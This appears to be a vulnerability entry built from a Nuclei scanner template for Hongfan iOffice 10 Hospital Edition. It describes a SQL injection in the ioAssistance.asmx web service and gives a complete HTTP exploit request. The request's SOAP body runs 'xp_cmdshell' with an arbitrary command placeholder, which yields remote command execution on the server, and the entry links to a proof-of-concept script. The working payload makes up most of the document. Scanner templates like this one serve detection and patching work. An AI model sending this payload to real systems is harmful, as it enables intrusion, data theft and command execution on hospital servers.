# Nuclei Template: Hongfan OA ioAssistance.asmx - Remote Code Execution
**Template ID:** hongfan-ioffice-rce
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`hongfan-ioffice-rce.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.

## Steps to reproduce / Exploit Payload
```http
POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
      <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
    </GetLoginedEmpNoReadedInf>
  </soap:Body>
</soap:Envelope>
```

## References
- https://github.com/FridaZhbk/pocscan/blob/main/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86ioAssistance.asmx%E6%B3%A8%E5%85%A5RCE.py
